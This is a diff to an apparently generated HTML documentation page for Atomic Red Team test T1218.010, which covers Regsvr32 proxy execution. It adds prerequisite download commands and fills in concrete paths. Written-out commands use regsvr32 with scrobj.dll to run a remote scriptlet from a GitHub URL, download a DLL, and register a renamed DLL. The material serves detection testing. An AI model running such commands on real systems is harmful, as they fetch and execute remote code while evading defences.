@@ -914,6 +914,34 @@
     </a>
     <ul class="nav section-nav flex-column">
      <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#dependencies-run-with-powershell">
+       Dependencies:  Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         powershell
+        </span>
+       </code>
+       !
+      </a>
+      <ul class="nav section-nav flex-column">
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#description-regsvr32-sct-must-exist-on-disk-at-specified-location-filename">
+         Description: Regsvr32.sct must exist on disk at specified location (#{filename})
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#check-prereq-commands">
+         Check Prereq Commands:
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#get-prereq-commands">
+         Get Prereq Commands:
+        </a>
+       </li>
+      </ul>
+     </li>
+     <li class="toc-h4 nav-item toc-entry">
       <a class="reference internal nav-link" href="#attack-commands-run-with-command-prompt">
        Attack Commands: Run with
        <code class="docutils literal notranslate">
@@ -949,6 +977,34 @@
     <ul class="nav section-nav flex-column">
      <li class="toc-h4 nav-item toc-entry">
       <a class="reference internal nav-link" href="#id2">
+       Dependencies:  Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         powershell
+        </span>
+       </code>
+       !
+      </a>
+      <ul class="nav section-nav flex-column">
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#description-allthethingsx86-dll-must-exist-on-disk-at-specified-location-dll-name">
+         Description: AllTheThingsx86.dll must exist on disk at specified location (#{dll_name})
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#id3">
+         Check Prereq Commands:
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#id4">
+         Get Prereq Commands:
+        </a>
+       </li>
+      </ul>
+     </li>
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id5">
        Attack Commands: Run with
        <code class="docutils literal notranslate">
         <span class="pre">
@@ -965,7 +1021,35 @@
     </a>
     <ul class="nav section-nav flex-column">
      <li class="toc-h4 nav-item toc-entry">
-      <a class="reference internal nav-link" href="#id3">
+      <a class="reference internal nav-link" href="#dependencies-run-with-command-prompt">
+       Dependencies:  Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         command_prompt
+        </span>
+       </code>
+       !
+      </a>
+      <ul class="nav section-nav flex-column">
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#description-test-requires-a-renamed-dll-file">
+         Description: Test requires a renamed dll file
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#id6">
+         Check Prereq Commands:
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#id7">
+         Get Prereq Commands:
+        </a>
+       </li>
+      </ul>
+     </li>
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id8">
        Attack Commands: Run with
        <code class="docutils literal notranslate">
         <span class="pre">
@@ -1012,9 +1096,35 @@
 <h3>Atomic Test #1 - Regsvr32 local COM scriptlet execution<a class="headerlink" href="#atomic-test-1-regsvr32-local-com-scriptlet-execution" title="Permalink to this headline">¶</a></h3>
 <p>Regsvr32.exe is a command-line program used to register and unregister OLE controls. Upon execution, calc.exe will be launched.</p>
 <p><strong>Supported Platforms:</strong> windows</p>
+<div class="section" id="dependencies-run-with-powershell">
+<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!<a class="headerlink" href="#dependencies-run-with-powershell" title="Permalink to this headline">¶</a></h4>
+<div class="section" id="description-regsvr32-sct-must-exist-on-disk-at-specified-location-filename">
+<h5>Description: Regsvr32.sct must exist on disk at specified location (#{filename})<a class="headerlink" href="#description-regsvr32-sct-must-exist-on-disk-at-specified-location-filename" title="Permalink to this headline">¶</a></h5>
+</div>
+<div class="section" id="check-prereq-commands">
+<h5>Check Prereq Commands:<a class="headerlink" href="#check-prereq-commands" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="nb">Test-Path</span> <span class="n">PathToAtomicsFolder</span><span class="p">\</span><span class="n">T1218</span><span class="p">.</span><span class="n">010</span><span class="p">\</span><span class="n">src</span><span class="p">\</span><span class="n">RegSvr32</span><span class="p">.</span><span class="n">sct</span><span class="p">)</span> <span class="p">{</span><span class="n">exit</span> <span class="n">0</span><span class="p">}</span> <span class="k">else</span> <span class="p">{</span><span class="n">exit</span> <span class="n">1</span><span class="p">}</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="get-prereq-commands">
+<h5>Get Prereq Commands:<a class="headerlink" href="#get-prereq-commands" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">New-Item</span> <span class="n">-Type</span> <span class="n">Directory</span> <span class="p">(</span><span class="nb">split-path</span> <span class="n">PathToAtomicsFolder</span><span class="p">\</span><span class="n">T1218</span><span class="p">.</span><span class="n">010</span><span class="p">\</span><span class="n">src</span><span class="p">\</span><span class="n">RegSvr32</span><span class="p">.</span><span class="n">sct</span><span class="p">)</span> <span class="n">-ErrorAction</span> <span class="n">ignore</span> <span class="p">|</span> <span class="nb">Out-Null</span>
+<span class="nb">Invoke-WebRequest</span> <span class="s2">&quot;https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/src/RegSvr32.sct&quot;</span> <span class="n">-OutFile</span> <span class="s2">&quot;PathToAtomicsFolder\T1218.010\src\RegSvr32.sct&quot;</span>
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1218</span><span class="o">.</span><span class="mi">010</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">1</span> <span class="o">-</span><span class="n">GetPreReqs</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
 <div class="section" id="attack-commands-run-with-command-prompt">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#attack-commands-run-with-command-prompt" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>regsvr32.exe /s /u /i:#{filename} scrobj.dll
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>regsvr32.exe /s /u /i:PathToAtomicsFolder\T1218.010\src\RegSvr32.sct scrobj.dll
 </pre></div>
 </div>
 <div class="cell docutils container">
@@ -1033,7 +1143,7 @@ windows defender real-time protection to fix it. Upon execution, calc.exe will b
 <p><strong>Supported Platforms:</strong> windows</p>
 <div class="section" id="id1">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>regsvr32.exe /s /u /i:#{url} scrobj.dll
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll
 </pre></div>
 </div>
 <div class="cell docutils container">
@@ -1050,8 +1160,34 @@ windows defender real-time protection to fix it. Upon execution, calc.exe will b
 <p>Regsvr32.exe is a command-line program used to register and unregister OLE controls. Upon execution, calc.exe will be launched.</p>
 <p><strong>Supported Platforms:</strong> windows</p>
 <div class="section" id="id2">
-<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id2" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>IF &quot;%PROCESSOR_ARCHITECTURE%&quot;==&quot;AMD64&quot; (C:\Windows\syswow64\regsvr32.exe /s #{dll_name}) ELSE ( regsvr32.exe /s #{dll_name} )
+<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!<a class="headerlink" href="#id2" title="Permalink to this headline">¶</a></h4>
+<div class="section" id="description-allthethingsx86-dll-must-exist-on-disk-at-specified-location-dll-name">
+<h5>Description: AllTheThingsx86.dll must exist on disk at specified location (#{dll_name})<a class="headerlink" href="#description-allthethingsx86-dll-must-exist-on-disk-at-specified-location-dll-name" title="Permalink to this headline">¶</a></h5>
+</div>
+<div class="section" id="id3">
+<h5>Check Prereq Commands:<a class="headerlink" href="#id3" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="nb">Test-Path</span> <span class="n">PathToAtomicsFolder</span><span class="p">\</span><span class="n">T1218</span><span class="p">.</span><span class="n">010</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">AllTheThingsx86</span><span class="p">.</span><span class="n">dll</span><span class="p">)</span> <span class="p">{</span><span class="n">exit</span> <span class="n">0</span><span class="p">}</span> <span class="k">else</span> <span class="p">{</span><span class="n">exit</span> <span class="n">1</span><span class="p">}</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="id4">
+<h5>Get Prereq Commands:<a class="headerlink" href="#id4" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">New-Item</span> <span class="n">-Type</span> <span class="n">Directory</span> <span class="p">(</span><span class="nb">split-path</span> <span class="n">PathToAtomicsFolder</span><span class="p">\</span><span class="n">T1218</span><span class="p">.</span><span class="n">010</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">AllTheThingsx86</span><span class="p">.</span><span class="n">dll</span><span class="p">)</span> <span class="n">-ErrorAction</span> <span class="n">ignore</span> <span class="p">|</span> <span class="nb">Out-Null</span>
+<span class="nb">Invoke-WebRequest</span> <span class="s2">&quot;https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/bin/AllTheThingsx86.dll&quot;</span> <span class="n">-OutFile</span> <span class="s2">&quot;PathToAtomicsFolder\T1218.010\bin\AllTheThingsx86.dll&quot;</span>
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1218</span><span class="o">.</span><span class="mi">010</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">3</span> <span class="o">-</span><span class="n">GetPreReqs</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="id5">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id5" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>IF &quot;%PROCESSOR_ARCHITECTURE%&quot;==&quot;AMD64&quot; (C:\Windows\syswow64\regsvr32.exe /s PathToAtomicsFolder\T1218.010\bin\AllTheThingsx86.dll) ELSE ( regsvr32.exe /s PathToAtomicsFolder\T1218.010\bin\AllTheThingsx86.dll )
 </pre></div>
 </div>
 <div class="cell docutils container">
@@ -1067,9 +1203,36 @@ windows defender real-time protection to fix it. Upon execution, calc.exe will b
 <h3>Atomic Test #4 - Regsvr32 Registering Non DLL<a class="headerlink" href="#atomic-test-4-regsvr32-registering-non-dll" title="Permalink to this headline">¶</a></h3>
 <p>Replicating observed Gozi maldoc behavior registering a dll with an altered extension</p>
 <p><strong>Supported Platforms:</strong> windows</p>
-<div class="section" id="id3">
-<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id3" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>regsvr32 /s #{dll_file}
+<div class="section" id="dependencies-run-with-command-prompt">
+<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code>!<a class="headerlink" href="#dependencies-run-with-command-prompt" title="Permalink to this headline">¶</a></h4>
+<div class="section" id="description-test-requires-a-renamed-dll-file">
+<h5>Description: Test requires a renamed dll file<a class="headerlink" href="#description-test-requires-a-renamed-dll-file" title="Permalink to this headline">¶</a></h5>
+</div>
+<div class="section" id="id6">
+<h5>Check Prereq Commands:<a class="headerlink" href="#id6" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>if exist %temp%\shell32.jpg ( exit 0 ) else ( exit 1 )
+
+</pre></div>
+</div>
+</div>
+<div class="section" id="id7">
+<h5>Get Prereq Commands:<a class="headerlink" href="#id7" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>copy &quot;C:\Windows\System32\shell32.dll&quot; &quot;%temp%\shell32.jpg&quot;
+
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1218</span><span class="o">.</span><span class="mi">010</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">4</span> <span class="o">-</span><span class="n">GetPreReqs</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="id8">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id8" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>regsvr32 /s %temp%\shell32.jpg
 </pre></div>
 </div>
 <div class="cell docutils container">
